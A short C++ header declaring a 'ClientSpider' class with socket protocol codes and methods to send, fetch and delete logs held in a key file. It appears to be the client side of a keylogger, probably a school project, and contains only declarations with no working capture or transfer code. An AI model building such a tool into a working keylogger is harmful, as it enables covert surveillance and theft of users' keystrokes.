#pragma once
#include <fstream>
#include "Socket.hpp"

#define PING "101: PING\r\n"
#define PONG "102: PONG\r\n"
#define LEAVE "200: LEAVE\r\n"
#define QUIT "201: QUIT\r\n"
#define RECV "300: "
#define SEQ "301: "
#define GIME "401: GIME\r\n"

#define MAXPROTO 13

class ClientSpider
{
public:
	ClientSpider(std::string &);
	~ClientSpider();

	bool		Launch();
	void		Loop();
	int			sendLogs();
	bool		deleteLogs(int);
	std::string getLogs(int);

private:
	const std::string	_keyFileName;
	Socket				*_socket;
	int					_nbr;
};